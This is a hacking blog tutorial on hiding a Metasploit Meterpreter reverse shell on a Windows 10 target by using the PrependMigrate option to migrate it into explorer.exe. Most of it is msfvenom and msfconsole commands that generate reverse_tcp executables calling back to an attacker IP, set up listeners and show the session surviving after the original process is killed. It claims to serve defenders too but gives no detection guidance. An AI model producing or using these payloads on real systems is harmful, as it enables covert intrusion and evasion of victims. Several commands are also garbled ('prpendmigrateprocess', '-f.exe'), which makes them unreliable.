---
title: 'Hiding Shell using PrependMigrate -Metasploit'
date: 2019-12-13T14:23:00+01:00
draft: false
---

In this article, you will get to know about the strength of mfsvenom along with PrependMigrate. You will also learn how to migrate the created payload into processes currently running on the targeted machine so, the victim unable to find the malicious file. It is very important to migrate your backdoor payload because if the target is alerted and decides to take measures to kill the process then, your session will also get killed. Therefore, an attacker must do this as soon as the session opens.

### **Table of Content**

*   **Basic Terminologies**
    *   Metasploit Framework
    *   MSFvenom
*   **Hiding shell with PrependMigrate**
    *   With MSFvenom.
    *   Without MSFvenom.

**Basic Terminologies**

**Metasploit Framework**

[Metasploit Framework](https://en.wikipedia.org/wiki/Metasploit_Project#Metasploit_Framework), an open source tool for developing and executing exploit code against a remote target machine.

**Steps for exploiting a system using the Framework include:**

*   Choosing and configuring an exploit
*   Checking whether the intended target system is susceptible to the chosen exploit
*   Choosing and configuring a payload
*   Choosing the encoding technique
*   Executing the exploit.

This modular approach – allowing the combination of any exploit with any payload – is the major advantage of the Framework. It facilitates the tasks of attackers, exploit writers and payload writers. 

### **Msfvenom**

MSFvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. It is used to generate and encode various types of payload that are available in Metasploit Framework. The advantages of msfvenom are:

*   One single tool
*   Standardized command line options
*   Increased speed

### **PrependMigrate**

PrependMigrate is an option that allows us to link our session with an ongoing process on the target system. It can also transfer a session by linking it from one process to another. It comes handy as it is difficult for the target to find the malicious process so it becomes paramount for the attacker to cover their tracks.

**Configurations used in Practical**

**Attacker:**

    OS: Kali Linux

    IP: 192.168.1.107

**Target:**

 OS: Windows 10

      IP: 192.168.1.104

### **1st Method**

Let’s start the game of conceal and seek. You have to conceal to save yourself and let the target try to find you.

Starting with MSFvenom we will be creating a malicious executable named raj.exe and conceal the generated executable behind a process named explorer.exe (you can choose any process running on task manager) by PrependMigrate process.

```
msfvenom –p windows/meterpreter/reverse\_tcp lhost=192.168.1.107 lport=1234 prpendmigrateprocess=explorer.exe prependmigrate=true -f.exe > raj.exe
```

![](https://i0.wp.com/1.bp.blogspot.com/-6CpBwEk3xNc/XfOLOtwnyPI/AAAAAAAAh60/7mZOyDtFHrwZlWE0dE633_68WNwZSa_nQCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

Next we will be loading the Metasploit framework on Kali Linux by using **msfconsole** keyword**.** Then set the following options to enable our handler:

```
use exploit/multi/handler  
set payload windows/meterpreter/reverse\_tcp  
set lhost 192.168.1.107  
set lport 1234  
exploit
```

![](https://i1.wp.com/1.bp.blogspot.com/-h9ZXYpvvKPg/XfOLO_vnRBI/AAAAAAAAh64/PEBQ4C_XM0YjhynvneZwcw8hvu5q5npzgCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

Now, we will send the payload to the target machine and run the executable on the Target Machine. This will generate a meterpreter session which will be captured by the listener we created earlier. You can access the target system but if the target acknowledges that the system is compromised; then they can take security measures to end your session. To escape from this situation, attacker’s first responsibility is to conceal the executable payload behind the process so the victim cannot identify it in any way possible.

Use the following ps command to check the processes that are running presently and filter with the raj.exe

```
ps|grep raj.exe
```

 The process ID (PID) of raj.exe i.e. 4848 as shown in process list and if the victim kills the raj.exe i.e. 4848 PID then the running process will end. Thus, ending our session with a simple command:

```
kill 4848
```

But you do not need to worry as PrependMigrate saves the day by letting us conceal raj.exe behind the explorer.exe and you will be at an advantage as your meterpreter session is still running. Even after the system reboots, the Meterpreter on the victim system attempts to connect to us every 5 seconds until it has successfully opened a session for us. And you can use sysinfo command to confirm that the session is still up and running.

![](https://i1.wp.com/1.bp.blogspot.com/-5BUAeDy657w/XfOLO8XKmJI/AAAAAAAAh68/oxopDraIQQAby2N_khsiNMewVsi0w_VXgCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

### **Second way**

The Second way of hiding shell using the PrependMigrate but without using msfvenom. Here, the objective is the same as the earlier. We will start with opening the Metasploit Framework.

Then use the following set of commands to create your payload:

```
use windows/meterpreter/reverse\_tcp  
set lhost 192.168.1.107  
set lport 4444  
set prependmigrate true  
set prependmigrateprocess explorer.exe  
generate –f.exe - o nisha.exe
```

![](https://i2.wp.com/1.bp.blogspot.com/-QrjDOtPPbug/XfOLPlbMFfI/AAAAAAAAh7A/U9rUpKavFo0Mk5uPcrDjiEmFWudCrxN3QCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

After the creation of malicious executable i.e. nisha.exe, we will create listener multi/handler using following commands:

```
use exploit/multi/handler  
set payload windows/meterpreter/reverse\_tcp  
set lhost 192.168.1.107  
set lport 4444  
exploit
```

Using the ps command along with grep command we will get the PID of nisha .exe i.e.4128

```
ps|grep nisha.exe
```

(Note: PID stands for process id, which means identification number for currently running process in memory. PPID stands for Parent Process Id, which means the parent process is responsible for creating the child (current) process. Through parent Process, the child process will be created.)

Now the we try ourselves to kill the nisha.exe process to get conceal from the victim with the following command:

```
kill 4128
```

But still, you have a victim’s session which means nisha.exe migrates into new process id of explorer.exe. And you can use sysinfo command to confirm that the session is still up and running.

![](https://i2.wp.com/1.bp.blogspot.com/-Iqr4prmpfeo/XfOLP14OMlI/AAAAAAAAh7E/GKxr26vAK50NBK6efhSjpVftIZbLAC4rgCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

**Conclusion**

This is how one conceals themselves. The purpose of this article is to serve both blue team and red team as one should be aware on how to locate and eliminate the attacker as well as how to conceal yourself when you are on the other side of the line.

**Author**: Nisha Sharma is trained in Certified Ethical hacking and Bug Bounty Hunter. Connect with her [**here**](https://www.linkedin.com/in/nishasharmaa/?originalSubdomain=in)

The post [Hiding Shell using PrependMigrate -Metasploit](https://www.hackingarticles.in/hiding-shell-using-prependmigrate-metasploit/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/36qLwQi